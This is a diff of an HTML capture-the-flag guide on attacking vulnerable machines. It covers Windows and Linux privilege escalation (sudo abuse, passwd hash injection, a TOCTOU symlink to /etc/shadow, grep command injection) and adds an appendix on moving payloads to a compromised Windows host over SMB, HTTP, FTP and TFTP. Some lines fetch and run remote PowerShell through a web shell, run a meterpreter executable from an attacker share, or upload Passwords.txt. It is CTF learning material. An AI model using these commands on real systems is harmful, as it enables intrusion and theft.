+<li>If the PATH is writeable, then you’ll be able to set it to any directory you want. We recommend setting it to one that has commands vulnerable to shell escapes.</li>
 </ul>
 </div></blockquote>
 <ul class="simple">
@@ -1491,6 +1531,8 @@ password: &lt;password will be asked&gt;
 </ul>
 <blockquote>
 <div><div class="highlight-None"><div class="highlight"><pre><span></span>ssh username@IP -t &quot;bash --noprofile&quot;
+
+-t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty
 </pre></div>
 </div>
 </div></blockquote>
@@ -1614,9 +1656,9 @@ cat ~/.bash_logout
 </div>
 </div>
 <div class="section" id="unprivileged-shell-to-privileged-shell">
-<span id="id14"></span><h2>Unprivileged Shell to Privileged Shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
+<span id="id15"></span><h2>Unprivileged Shell to Privileged Shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
 <p>Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.</p>
-<p>If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.</p>
+<p>[Linux] If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.</p>
 <div class="section" id="windows-privilege-escalation">
 <h3>Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Permalink to this headline">¶</a></h3>
 <p>If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize</p>
@@ -1695,15 +1737,14 @@ Network Card(s):           1 NIC(s) Installed.
 <div class="section" id="sherlock-and-powerup-powershell-script">
 <h4>Sherlock and PowerUp Powershell Script<a class="headerlink" href="#sherlock-and-powerup-powershell-script" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
-<li><a class="reference external" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn’t resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.</li>
+<li><a class="reference external" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> PowerShell script by <a class="reference external" href="https://twitter.com/_RastaMouse">rastamouse</a> to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn’t resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.</li>
 <li><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.</li>
 </ul>
 <p>The above can be executed by</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString(&quot;http://YourIP:8000/Sherlock.ps1&quot;); | powershell -noprofile -
-
-We execute powershell with noprofile and accept the input from stdin
 </pre></div>
 </div>
+<p>We execute powershell with noprofile and accept the input from stdin</p>
 </div>
 <div class="section" id="windows-exploit-suggestor">
 <h4>Windows Exploit Suggestor<a class="headerlink" href="#windows-exploit-suggestor" title="Permalink to this headline">¶</a></h4>
@@ -1802,13 +1843,14 @@ for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 
 <p>A few ‘common’ places: /tmp, /var/tmp, /dev/shm</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>find / -writable -type d 2&gt;/dev/null      # world-writeable folders
 find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders
-find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders
-find / -perm -o w -type f 2&gt;/dev/null     # world-writeable files
+find / -perm -o+w -type d 2&gt;/dev/null     # world-writeable folders
+find / -perm -o+w -type f 2&gt;/dev/null     # world-writeable files
+find / -type f -perm -o+w -not -type l -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; 2&gt;/dev/null # world-writeable files
 
-find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders
-find / -perm -o x -type f 2&gt;/dev/null     # world-executable files
+find / -perm -o+x -type d 2&gt;/dev/null     # world-executable folders
+find / -perm -o+x -type f 2&gt;/dev/null     # world-executable files
 
-find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders
+find / \( -perm -o+w -perm -o+x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders
 </pre></div>
 </div>
 </div>
@@ -1837,7 +1879,8 @@ find / -group groupname 2&gt; /dev/null
 <h3>Other Linux Privilege Escalation<a class="headerlink" href="#other-linux-privilege-escalation" title="Permalink to this headline">¶</a></h3>
 <div class="section" id="execution-of-binary-from-relative-location-than-absolute">
 <h4>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Permalink to this headline">¶</a></h4>
-<p>If we figure out that a suid binary is running with relative locations (for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>”)(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
+<p>If we figure out that a suid binary is running with relative locations (for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>”)(figured out by running strings on the binary). The problem with this is, that it’s trying to
+execute a file/ script/ program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
 <p>Something like this:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>system(&quot;/usr/bin/env echo and now what?&quot;);
 </pre></div>
@@ -1958,7 +2001,7 @@ lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -&gt; /etc/
 </div>
 <div class="section" id="time-of-check-to-time-of-use">
 <h4>Time of check to time of use<a class="headerlink" href="#time-of-check-to-time-of-use" title="Permalink to this headline">¶</a></h4>
-<p>In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and open to open a specific file), when used in a setuid program, has a TOCTTOU bug:</p>
+<p>In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and to open a specific file), when used in a setuid program, has a TOCTTOU bug:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>if (access(&quot;file&quot;, W_OK) != 0) {
   exit(1);
 }
@@ -1998,10 +2041,23 @@ symlink(&quot;/etc/shadow&quot;, &quot;file&quot;);
 <li>Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information.</li>
 <li>For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow.</li>
 <li>Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled.</li>
-<li>If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example</li>
+<li>If passwordless accounts are disabled, you can put the hash of a password of your choice. we can use the mkpasswd to generate password hashes, for example</li>
 </ul>
 <blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>perl -le &#39;print crypt(&quot;foo&quot;, &quot;aa&quot;)&#39; to set the password to foo.
+<div><div class="highlight-None"><div class="highlight"><pre><span></span> Usage: mkpasswd [OPTIONS]... [PASSWORD [SALT]]
+ Crypts the PASSWORD using crypt(3).
+
+    -m, --method=TYPE     select method TYPE
+    -5                    like --method=md5
+    -S, --salt=SALT       use the specified SALT
+    -R, --rounds=NUMBER   use the specified NUMBER of rounds
+    -P, --password-fd=NUM read the password from file descriptor NUM
+                          instead of /dev/tty
+    -s, --stdin           like --password-fd=0
+    -h, --help            display this help and exit
+    -V, --version         output version information and exit
+
+mkpasswd can generate DES, MD5, SHA-256, SHA-512
 </pre></div>
 </div>
 </div></blockquote>
@@ -2030,7 +2086,7 @@ system(&quot;/bin/bash -p&quot;); }
 </div>
 <div class="section" id="mysql-privileged-escalation">
 <h3>MySQL Privileged Escalation<a class="headerlink" href="#mysql-privileged-escalation" title="Permalink to this headline">¶</a></h3>
-<p>If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a class="reference external" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">User-Defined Function (UDF) Dynamic Library Exploit</a> . A blog named <a class="reference external" href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">Gaining a root shell using mysql user defined functions and setuid binaries</a></p>
+<p>If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a class="reference external" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">User-Defined Function (UDF) Dynamic Library Exploit</a> . Refer <a class="reference external" href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">Gaining a root shell using mysql user defined functions and setuid binaries</a></p>
 <div class="section" id="more-information">
 <h4>More Information<a class="headerlink" href="#more-information" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
@@ -2061,7 +2117,7 @@ system(&quot;/bin/bash -p&quot;); }
 Dpkg::Post-Invoke {&quot;command&quot;;};
 </pre></div>
 </div>
-<p>They execute commands before/after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);</p>
+<p>They execute commands before/ after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);</p>
 </div>
 <div class="section" id="apt">
 <h4>APT<a class="headerlink" href="#apt" title="Permalink to this headline">¶</a></h4>
@@ -2106,7 +2162,7 @@ echo &quot;example_user ALL=(ALL) ALL&quot; &gt; /etc/sudoers
 <div class="highlight-None"><div class="highlight"><pre><span></span>cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
 </pre></div>
 </div>
-<p>which will add contents of temp.sh to tidyup.sh. ( Assuming tidyup.sh is running as root by crontab )</p>
+<p>which will add contents of temp.sh to tidyup.sh. (Assuming tidyup.sh is running as root by crontab)</p>
 </div>
 <div class="section" id="tcpdump">
 <h4>tcpdump<a class="headerlink" href="#tcpdump" title="Permalink to this headline">¶</a></h4>
@@ -2152,9 +2208,8 @@ sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;sh -c /b
 find foo -exec whoami \;
 </pre></div>
 </div>
-<p>Here, the foo file ( a blank file ) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.</p>
-<p>HollyGrace has mentioned this in <a class="reference external" href="https://www.gracefulsecurity.com/linux-privesc-abusing-suid/">Linux PrivEsc: Abusing SUID</a></p>
-<p>More can be learn <a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>.</p>
+<p>Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.</p>
+<p>HollyGrace has mentioned this in <a class="reference external" href="https://www.gracefulsecurity.com/linux-privesc-abusing-suid/">Linux PrivEsc: Abusing SUID</a> More can be learn <a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>.</p>
 </div>
 </div>
 <div class="section" id="unix-wildcards">
@@ -2415,7 +2470,7 @@ uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfi
 </div>
 </div>
 <div class="section" id="tips-and-tricks">
-<span id="id17"></span><h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
+<span id="id18"></span><h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="windows">
 <h3>Windows<a class="headerlink" href="#windows" title="Permalink to this headline">¶</a></h3>
 <div class="section" id="get-childitem-mode-values">
@@ -2905,8 +2960,8 @@ This makes all connections considered &quot;insecure&quot; fail unless -k, --ins
 <h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Permalink to this headline">¶</a></h4>
 <p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information stored.</p>
 </div>
-<div class="section" id="id20">
-<h4>PHP<a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id21">
+<h4>PHP<a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h4>
 <ul>
 <li><p class="first">PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a> and <a class="reference external" href="http://www.madirish.net/402">Exploiting PHP PCRE Functions</a></p>
 </li>
@@ -3178,7 +3233,7 @@ if __name__ == &quot;__main__&quot;:
 <p>If we find that home directory contains</p>
 <div class="section" id="firefox-thunderbird-seabird">
 <h4>Firefox/ Thunderbird/ Seabird<a class="headerlink" href="#firefox-thunderbird-seabird" title="Permalink to this headline">¶</a></h4>
-<p>We can utilize <a class="reference external" href="https://github.com/unode/firefox_decrypt">Firefox Decrypt</a> is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.</p>
+<p>We can utilize <a class="reference external" href="https://github.com/unode/firefox_decrypt">Firefox Decrypt</a> is a tool to extract passwords from Mozilla (Firefox/ Thunderbird/ Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.</p>
 </div>
 </div>
 <div class="section" id="sudoers-file">
@@ -3317,17 +3372,17 @@ Remember grep works in a way &quot;grep bitvijays /etc/passwd&quot; is find bitv
      } else {
      passthru(&quot;grep -i $key dictionary.txt&quot;);
  }
-
- Here we can use &quot;.* /etc/passwd #&quot;
 </pre></div>
 </div>
 </li>
 </ul>
 <blockquote>
-<div>This command searches for any character in the file and comments out the reference to dictionary.txt</div></blockquote>
+<div><p>Here we can use “.* /etc/passwd #”</p>
+<p>This command searches for any character in the file and comments out the reference to dictionary.txt</p>
+</div></blockquote>
 </div>
-<div class="section" id="id23">
-<h3>Others<a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="id24">
+<h3>Others<a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h3>
 <ul class="simple">
 <li>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.</li>
 <li>If there’s a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.</li>
@@ -3362,7 +3417,7 @@ iso.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1 = INTEGER: 33
 </div>
 <p>Now, convert the decimal value after “iso.3.6.1.2.1.4.34.1.3.2” to hex which would be your IPv6 address “3002:1234:5678:ABCD::1”</p>
 </div></blockquote>
-<div class="admonition-todo admonition" id="index-7">
+<div class="admonition-todo admonition" id="index-6">
 <p class="first admonition-title">Todo</p>
 <p class="last">Mention examples for IPv6 connect</p>
 </div>
@@ -4185,6 +4240,316 @@ else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) 
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
 <p class="last">Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!</p>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="appendix-iii-transferring-files-from-linux-to-windows-post-exploitation">
+<span id="a3-tranfer-files-from-linux-to-windows"></span><h2>Appendix-III Transferring Files from Linux to Windows (post-exploitation)<a class="headerlink" href="#appendix-iii-transferring-files-from-linux-to-windows-post-exploitation" title="Permalink to this headline">¶</a></h2>
+<p>There would times, where we have a Windows Shell (Command Prompt) and need to copy over some files to the Windows OS. Most of the stuff has been completely taken from <a class="reference external" href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/">Transferring Files from Linux to Windows (post-exploitation)</a> Here are the few methods</p>
+<div class="section" id="smb">
+<h3>SMB<a class="headerlink" href="#smb" title="Permalink to this headline">¶</a></h3>
+<p>We need to setup a SMB Server on the Debian/ Kali machine</p>
+<div class="section" id="smb-server-attacker">
+<h4>SMB Server - Attacker<a class="headerlink" href="#smb-server-attacker" title="Permalink to this headline">¶</a></h4>
+<p>We can utilize Impacket smbserver to create a SMB Server without authentication, so that anyone can access the share and download the files.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>/usr/share/doc/python-impacket/examples/smbserver.py
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support]
+                   shareName sharePath
+
+This script will launch a SMB Server and add a share specified as an argument.
+You need to be root in order to bind to port 445. No authentication will be
+enforced. Example: smbserver.py -comment &#39;My share&#39; TMP /tmp
+
+positional arguments:
+ shareName         name of the share to add
+ sharePath         path of the share to add
+
+optional arguments:
+ -h, --help        show this help message and exit
+ -comment COMMENT  share&#39;s comment to display when asked for shares
+ -debug            Turn DEBUG output ON
+ -smb2support      SMB2 Support (experimental!)
+</pre></div>
+</div>
+<p>So, we can setup by using</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>python smbserver.py SHELLS /root/Desktop/SHELLS
+
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</pre></div>
+</div>
+</div>
+<div class="section" id="accessing-the-share-linux">
+<h4>Accessing the share - Linux<a class="headerlink" href="#accessing-the-share-linux" title="Permalink to this headline">¶</a></h4>
+<p>We can use smbclient to access the share</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>smbclient -L 10.10.10.10 --no-pass
+WARNING: The &quot;syslog&quot; option is deprecated
+
+       Sharename       Type      Comment
+       ---------       ----      -------
+       IPC$            Disk
+       SHELLS          Disk
+ Reconnecting with SMB1 for workgroup listing.
+ Connection to localhost failed (Error NT_STATUS_NETWORK_UNREACHABLE)
+ Failed to connect with SMB1 -- no workgroup available
+</pre></div>
+</div>
+</div>
+<div class="section" id="accessing-the-share-windows">
+<h4>Accessing the share - Windows<a class="headerlink" href="#accessing-the-share-windows" title="Permalink to this headline">¶</a></h4>
+<p>We can use net view to check the shares</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>net view \\10.10.10.10
+
+Shared resources at \\10.10.10.10
+
+(null)
+
+Share name Type Used as Comment
+-------------------------------
+SHELLS     Disk
+The command completed sucessfully
+</pre></div>
+</div>
+</div>
+<div class="section" id="copying-the-files-windows">
+<h4>Copying the Files - Windows<a class="headerlink" href="#copying-the-files-windows" title="Permalink to this headline">¶</a></h4>
+<p>From the Windows Command Prompt</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>dir \\10.10.14.16\SHELLS
+
+Volume in drive \\10.10.14.16\SHELLS has no label.
+Volume Serial Number is ABCD-EFAA
+
+Directory of \\10.10.14.16\SHELLS
+
+04/10/2018  11:47 AM    &lt;DIR&gt;          .
+04/08/2018  06:25 PM    &lt;DIR&gt;          ..
+04/10/2018  11:47 AM            73,802 ps.exe
+              1 File(s)        101,696 bytes
+              2 Dir(s)  15,207,469,056 bytes free
+</pre></div>
+</div>
+<p>We can directly copy the file</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>C:\Users\bitvijays\Desktop&gt; copy \\10.10.14.16\SHELLS\ps.exe .
+       1 file(s) copied.
+</pre></div>
+</div>
+<p>or directly execute it without copying</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>\\10.10.14.16\SHELLS\ps.exe
+
+ps.exe can be your meterpreter exe
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="id30">
+<h3>HTTP<a class="headerlink" href="#id30" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="setting-up-the-server">
+<h4>Setting up the Server<a class="headerlink" href="#setting-up-the-server" title="Permalink to this headline">¶</a></h4>
+<p>We can use python-SimpleHTTPServer to set up a HTTP Web Server</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>python -m SimpleHTTPServer
+</pre></div>
+</div>
+</div>
+<div class="section" id="accessing-the-server-windows">
+<h4>Accessing the Server - Windows<a class="headerlink" href="#accessing-the-server-windows" title="Permalink to this headline">¶</a></h4>
+<p><strong>Windows Command Prompt</strong></p>
+<p>We can use powershell to download a file from a command prompt</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.10.10:8000/ps.exe&#39;,&#39;C:\Users\bitvijays\Desktop\ps.exe&#39;)&quot;
+</pre></div>
+</div>
+<p><strong>CertUtil</strong></p>
+<p>CertUtil command can be abused to download a file from internet.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>certutil.exe -urlcache -split -f &quot;https://download.sysinternals.com/files/PSTools.zip&quot; pstools.zip
+</pre></div>
+</div>
+<p><strong>Bitsadmin</strong></p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/ps.exe c:\Users\bitvijays\Desktop\ps.exe
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="ftp">
+<h3>FTP<a class="headerlink" href="#ftp" title="Permalink to this headline">¶</a></h3>
+<p>We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.</p>
+<div class="section" id="id31">
+<h4>Setting up the Server<a class="headerlink" href="#id31" title="Permalink to this headline">¶</a></h4>
+<p>We can either use Python-pyftpdlib or Metasploit to create a FTP Server</p>
+<p><strong>Python-pyftpdlib</strong></p>
+<p>Install using apt</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>apt-get install python-pyftpdlib
+</pre></div>
+</div>
+<p>Now from the directory we want to serve, just run the Python module. It runs on port 2121 by default (can be changed using -p parameter) and accepts anonymous authentication. To listen on the standard port:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>/home/bitvijays/SHELLS$ python -m pyftpdlib -p 21
+
+Usage: python -m pyftpdlib [options]
+
+Start a stand alone anonymous FTP server.
+
+Options:
+ -h, --help : show this help message and exit
+ -i ADDRESS, --interface=ADDRESS : specify the interface to run on (default all interfaces)
+ -p PORT, --port=PORT : specify port number to run on (default 2121)
+ -w, --write :  grants write access for logged in user (default read-only)
+ -d FOLDER, --directory=FOLDER : specify the directory to share (default current directory)
+ -n ADDRESS, --nat-address=ADDRESS : the NAT address to use for passive connections
+ -r FROM-TO, --range=FROM-TO : the range of TCP ports to use for passive connections (e.g. -r 8000-9000)
+ -D, --debug : enable DEBUG logging evel
+ -v, --version : print pyftpdlib version and exit
+ -V, --verbose : activate a more verbose logging
+ -u USERNAME, --username=USERNAME : specify username to login with (anonymous login will be disabled and password required if supplied)
+ -P PASSWORD, --password=PASSWORD : specify a password to login with (username required to be useful)
+</pre></div>
+</div>
+<p><strong>Metasploit</strong></p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Name: FTP File Server
+Module: auxiliary/server/ftp
+License: Metasploit Framework License (BSD)
+Rank: Normal
+
+Provided by:
+hdm &lt;x@hdm.io&gt;
+
+Available actions:
+Name     Description
+----     -----------
+Service
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+FTPPASS                    no        Configure a specific password that should be allowed access
+FTPROOT   /tmp/ftproot     yes       The FTP root directory to serve files from
+FTPUSER                    no        Configure a specific username that should be allowed access
+PASVPORT  0                no        The local PASV data port to listen on (0 is random)
+SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+SRVPORT   21               yes       The local port to listen on.
+SSL       false            no        Negotiate SSL for incoming connections
+SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
+
+Description:
+This module provides a FTP service
+</pre></div>
+</div>
+</div>
+<div class="section" id="access-using-ftp">
+<h4>Access using FTP<a class="headerlink" href="#access-using-ftp" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ftp 10.10.10.10
+Connected to 10.10.10.10.
+220 FTP Server Ready
+Name (localhost:root): anonymous
+331 User name okay, need password...
+Password:
+230 Login OK
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp&gt; ls
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls
+total 160
+drwxr-xr-x   2 0      0       512 Jan  1  2000 ..
+drwxr-xr-x   2 0      0       512 Jan  1  2000 .
+-rw-r--r--   1 0      0       166 Jan  1  2000 secret.zip
+226 Transfer complete.
+
+ftp&gt; get secret.zip
+local: secret.zip remote: secret.zip
+200 PORT command successful.
+150 Opening BINARY mode data connection for secret.zip
+226 Transfer complete.
+166 bytes received in 0.00 secs (138.4367 kB/s)
+ftp&gt;
+</pre></div>
+</div>
+<p>FTP can also accepts a series of commands stored in a text file</p>
+<p>Contents of a text file</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>open 10.10.10.10
+anonymous
+anonymous
+binary
+get ps.exe
+bye
+</pre></div>
+</div>
+<p>Passing parameter to ftp</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ftp -s:filename-containing-commands
+</pre></div>
+</div>
+<p>The file can be created by using echo</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;open 10.10.10.10&quot; &gt;&gt; commands.txt
+echo &quot;anonymous&quot; &gt;&gt; commands.txt
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="tftp">
+<h3>TFTP<a class="headerlink" href="#tftp" title="Permalink to this headline">¶</a></h3>
+<p>We can also utilize TFTP to download or upload files</p>
+<div class="section" id="id32">
+<h4>Setting up the Server<a class="headerlink" href="#id32" title="Permalink to this headline">¶</a></h4>
+<p>Metasploit module</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>use auxiliary/server/tftp
+msf auxiliary(server/tftp) &gt; info
+
+      Name: TFTP File Server
+    Module: auxiliary/server/tftp
+   License: Metasploit Framework License (BSD)
+      Rank: Normal
+
+Provided by:
+ jduck &lt;jduck@metasploit.com&gt;
+ todb &lt;todb@metasploit.com&gt;
+
+Available actions:
+ Name     Description
+ ----     -----------
+ Service
+
+Basic options:
+ Name        Current Setting  Required  Description
+ ----        ---------------  --------  -----------
+ OUTPUTPATH  /tmp             yes       The directory in which uploaded files will be written.
+ SRVHOST     0.0.0.0          yes       The local host to listen on.
+ SRVPORT     69               yes       The local port to listen on.
+ TFTPROOT    /tmp             yes       The TFTP root directory to serve files from
+
+Description:
+ This module provides a TFTP service
+
+msf auxiliary(server/tftp) &gt; run
+[*] Auxiliary module running as background job 0.
+
+[*] Starting TFTP server on 0.0.0.0:69...
+[*] Files will be served from /tmp
+[*] Uploaded files will be saved in /tmp
+</pre></div>
+</div>
+</div>
+<div class="section" id="accessing-the-share">
+<h4>Accessing the Share<a class="headerlink" href="#accessing-the-share" title="Permalink to this headline">¶</a></h4>
+<p>Downloading a file</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>tftp -i 10.10.10.10 GET ps.exe
+</pre></div>
+</div>
+<p>Uploading a file</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>tftp -i 10.10.10.10 PUT Passwords.txt
+</pre></div>
+</div>
+</div>
+<div class="section" id="installing-tftp-windows">
+<h4>Installing tftp - Windows<a class="headerlink" href="#installing-tftp-windows" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>pkgmgr /iu:&quot;TFTP&quot;
+</pre></div>
 </div>
 <div data-disqus-identifier="CTF Series : Vulnerable Machines" data-disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
 </div>
